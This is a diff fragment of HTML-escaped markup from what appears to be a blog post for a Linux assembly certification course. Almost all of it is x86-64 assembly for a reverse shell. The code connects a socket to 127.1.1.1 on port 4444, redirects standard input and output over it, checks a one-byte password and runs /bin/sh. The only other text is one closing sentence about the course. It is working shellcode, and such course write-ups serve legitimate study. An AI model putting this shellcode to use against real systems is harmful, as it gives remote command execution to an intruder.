-&lt;span class="normal"&gt; 89&lt;/span&gt;
-&lt;span class="normal"&gt; 90&lt;/span&gt;
-&lt;span class="normal"&gt; 91&lt;/span&gt;
-&lt;span class="normal"&gt; 92&lt;/span&gt;
-&lt;span class="normal"&gt; 93&lt;/span&gt;
-&lt;span class="normal"&gt; 94&lt;/span&gt;
-&lt;span class="normal"&gt; 95&lt;/span&gt;
-&lt;span class="normal"&gt; 96&lt;/span&gt;
-&lt;span class="normal"&gt; 97&lt;/span&gt;
-&lt;span class="normal"&gt; 98&lt;/span&gt;
-&lt;span class="normal"&gt; 99&lt;/span&gt;
-&lt;span class="normal"&gt;100&lt;/span&gt;
-&lt;span class="normal"&gt;101&lt;/span&gt;
-&lt;span class="normal"&gt;102&lt;/span&gt;
-&lt;span class="normal"&gt;103&lt;/span&gt;
-&lt;span class="normal"&gt;104&lt;/span&gt;
-&lt;span class="normal"&gt;105&lt;/span&gt;
-&lt;span class="normal"&gt;106&lt;/span&gt;
-&lt;span class="normal"&gt;107&lt;/span&gt;
-&lt;span class="normal"&gt;108&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;_start&lt;/span&gt;
-
-&lt;span class="k"&gt;section&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;.text&lt;/span&gt;
-
-&lt;span class="nl"&gt;_start:&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;jmp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;rev_data_struct:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;db&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x02&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x01&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x5c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x01&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x01&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x01&lt;/span&gt;
-
-
-&lt;span class="nl"&gt;shell:&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; store data struct address in r8&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ow"&gt;rel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;rev_data_struct&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; sock = socket(AF_INET, SOCK_STREAM, 0)&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; AF_INET = 2&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; SOCK_STREAM = 1&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; syscall number 41&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;dil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;sil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; copy socket descriptor to rdi for future use&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; server.sin_family = AF_INET &lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; server.sin_port = htons(PORT)&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; server.sin_addr.s_addr = inet_addr(&amp;quot;127.1.1.1&amp;quot;)&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; bzero(&amp;amp;server.sin_zero, 8)&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; remove 0x1 by subtracting&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;r8&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;r8&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;dl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; duplicate sockets&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; STDIN&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; STDOUT&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;sil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; STDERR&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;sil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;read password and store in first byte of r8&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;dl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; check password against expected password | , if fail jump out of bounds, should cause a segfault&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;cmp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7C&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;jnz&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; execve&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; First NULL push&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; push /bin//sh in reverse&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f6e69622f&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; store /bin//sh address in RDI&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Second NULL push&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; set RDX&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;
-
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Push address of /bin//sh&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; set RSI&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Call the Execve syscall&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;59&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
 
 &lt;p&gt;This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;
